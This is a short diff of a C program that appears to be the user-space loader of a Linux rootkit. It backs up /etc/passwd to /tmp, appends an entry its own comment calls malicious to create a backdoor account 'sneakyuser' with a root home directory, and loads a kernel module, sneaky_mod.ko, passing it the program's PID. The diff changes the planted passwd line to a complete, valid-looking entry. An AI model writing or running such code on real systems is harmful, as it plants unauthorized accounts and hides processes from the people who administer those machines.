@@ -53,7 +53,7 @@ int main()
     duplicate_file("/etc/passwd", "/tmp/passwd");
 
     // Append a malicious entry to the end of /etc/passwd
-    append_entry("/etc/passwd", "sneakyuser:jh730:/root:bash");
+    append_entry("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
 
     // Load the kernel module and pass the sneaky_pid parameter
     snprintf(cmd, sizeof(cmd), "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
